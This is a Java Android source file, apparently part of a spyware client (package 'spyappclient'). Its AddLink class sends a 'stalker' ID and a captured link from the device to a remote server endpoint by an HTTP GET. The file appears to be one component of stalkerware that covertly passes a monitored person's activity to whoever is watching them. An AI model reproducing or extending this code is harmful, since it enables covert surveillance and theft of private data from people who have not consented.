package com.example.alber.spyappclient;

import android.content.Context;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

public class AddLink {

    private String stalker;
    private String link;
    private Context context;

    private RequestQueue queue;

    AddLink(String stalker, String link, Context context){
        this.stalker=stalker;
        this.link=link;
//        this.link = this.link.substring(7);
        this.link = this.link.replace('/','_');
        this.context=context;
        this.queue= Volley.newRequestQueue(context);
    }


    public void postlink(){

        Log.d("response getting cords","cords");
        String url=URLS.ADDLINKS.url;
        url+=stalker;
        url+="/";
        url+=link;

        Log.d("url add",url);
        StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        Log.d("url add",response);

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.d("error","That didn't work!");
            }
        });

        queue.add(stringRequest);

    }

}
